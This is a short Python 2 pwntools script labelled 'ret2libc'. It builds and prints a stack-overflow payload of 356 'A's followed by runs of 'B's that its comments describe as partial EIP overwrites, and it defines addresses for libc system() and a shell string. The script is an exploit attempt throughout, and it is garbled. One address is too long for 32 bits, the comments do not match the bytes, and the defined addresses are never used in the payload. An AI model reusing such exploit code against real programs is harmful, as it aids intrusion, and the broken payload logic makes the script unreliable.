from pwn import *

# ret2libc

libc_system = 0xb7e631901	# \x90\x31\xe6\xb7
binbash = 0x804889b

# LSB
payload = ""
payload += "A" * 356
payload += "B" * 4 + "0" + "B"			# 06 bytes, partial EIP overwrite @ 4 offset # LSB
payload += "B" * 13 + "0"				# 14 bytes, partial EIP overwrite @ 13 offset
payload += "B" * 14 + "0" + "B" * 3		# 18 bytes, partial EIP overwrite at 14 bytes
payload += "B" * 11 + "0" + "B"			# 12 bytes,partial EIP overwrite @ 12 offset # MSB
payload += "B" * (50-6-14-18-12)		# Don't move the stack. Must stay at same offset.

print payload
